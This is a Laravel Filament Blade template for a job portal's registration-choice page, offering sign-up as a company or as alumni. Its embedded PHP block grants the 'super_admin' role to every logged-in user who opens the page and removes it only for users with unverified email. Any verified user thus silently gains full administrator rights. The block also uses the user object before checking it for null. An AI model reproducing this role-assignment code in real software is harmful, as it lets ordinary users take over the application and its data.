<x-filament-panels::page>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .fi-sidebar-nav,fi-topbar,
        .fi-header,
        .fi-user-menu,
        fi-sidebar,
        .fi-main-sidebar,
        .fi-icon-btn,
        .fi-input-wrp {
            display: none !important;
        }

        .fi-topbar {
            display: none !important;
        }
        .fi-body{
            background-color: #FEF2F2 !important;
        }
    </style>
    @php
        $user = auth()->user();
        $user->syncRoles(['super_admin']);

        if ($user && $user->email_verified_at == null) {
            $user->syncRoles(['Not_Verified']);
            $user->assignRole('Not_Verified');
        }
    @endphp
    <div class="bg-red-50 container mx-auto px-4 py-8">
        <div class="bg-red-50 max-w-6xl mx-auto">
            <div class="text-center mb-12">
                <h1 class="text-4xl font-bold text-slate-900 mb-4">Choose Your Registration Type</h1>
                <p class="text-lg text-slate-600 max-w-2xl mx-auto">
                    Select whether you want to register as a company looking to hire talent or as an applicant seeking
                    opportunities.
                </p>
            </div>

            <div class="bg-red-50 grid grid-cols-1 lg:grid-cols-2 gap-8 max-w-4xl mx-auto">
                <!-- Company Registration Card -->
                <div
                    class="bg-rose-50 rounded-xl shadow-lg border border-slate-200 p-8 hover:shadow-xl transition-all duration-300 hover:border-rose-300 hover:border-l-4 hover:border-l-rose-500">
                    <div class="text-center">
                        <!-- Company Icon -->
                        <div class="inline-flex items-center justify-center w-16 h-16 bg-pink-100 rounded-full mb-6">
                            <svg class="w-8 h-8 text-rose-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4">
                                </path>
                            </svg>
                        </div>

                        <h3 class="text-2xl font-bold text-slate-900 mb-4">Register as Company</h3>
                        <p class="text-slate-600 mb-8 leading-relaxed">
                            Create a company profile to post job opportunities, manage applications, and connect with
                            talented professionals in your industry.
                        </p>

                        <div class="space-y-3 mb-8 text-sm text-slate-500">
                            <div class="flex items-center">
                                <svg class="w-4 h-4 text-rose-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd"
                                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                        clip-rule="evenodd"></path>
                                </svg>
                                Post job openings
                            </div>
                            <div class="flex items-center">
                                <svg class="w-4 h-4 text-rose-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd"
                                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                        clip-rule="evenodd"></path>
                                </svg>
                                Review applications
                            </div>
                            <div class="flex items-center">
                                <svg class="w-4 h-4 text-rose-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd"
                                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                        clip-rule="evenodd"></path>
                                </svg>
                                Manage recruitment process
                            </div>
                        </div>

                        <form method="GET" action="/employeer/company-form" class="w-full">
                            @csrf
                            <button type="submit"
                                class="inline-flex items-center justify-center w-full px-6 py-3 bg-rose-600 hover:bg-rose-700 text-white font-semibold rounded-lg transition-colors duration-200">
                                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4">
                                    </path>
                                </svg>
                                Register as Company
                            </button>
                        </form>
                    </div>
                </div>

                <!-- Applicant Registration Card -->
                <div
                    class="bg-red-50 rounded-xl shadow-lg border border-slate-200 p-8 hover:shadow-xl transition-all duration-300 hover:border-red-300 hover:border-l-4 hover:border-l-red-500">
                    <div class="text-center">
                        <!-- Applicant Icon -->
                        <div class="inline-flex items-center justify-center w-16 h-16 bg-red-50 rounded-full mb-6">
                            <svg class="w-8 h-8 text-red-800" fill="none" stroke="currentColor"
                                viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                            </svg>
                        </div>

                        <h3 class="text-2xl font-bold text-slate-900 mb-4">Register as Alumni</h3>
                        <p class="text-slate-600 mb-8 leading-relaxed">
                            Create your professional profile to showcase your skills, experience, and find exciting
                            career opportunities that match your expertise.
                        </p>

                        <div class="space-y-3 mb-8 text-sm text-slate-500">
                            <div class="flex items-center">
                                <svg class="w-4 h-4 text-red-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd"
                                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                        clip-rule="evenodd"></path>
                                </svg>
                                Create detailed CV
                            </div>
                            <div class="flex items-center">
                                <svg class="w-4 h-4 text-red-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd"
                                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                        clip-rule="evenodd"></path>
                                </svg>
                                Apply for jobs
                            </div>
                            <div class="flex items-center">
                                <svg class="w-4 h-4 text-red-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd"
                                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                        clip-rule="evenodd"></path>
                                </svg>
                                Track applications
                            </div>
                        </div>

                        <form method="GET" action="/alumni/applicant-form" class="w-full">
                            @csrf
                            <button type="submit"
                                class="inline-flex items-center justify-center w-full px-6 py-3 bg-red-800 hover:bg-red-900 text-white font-semibold rounded-lg transition-colors duration-200">
                                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                                </svg>
                                Register as Alumni
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</x-filament-panels::page>
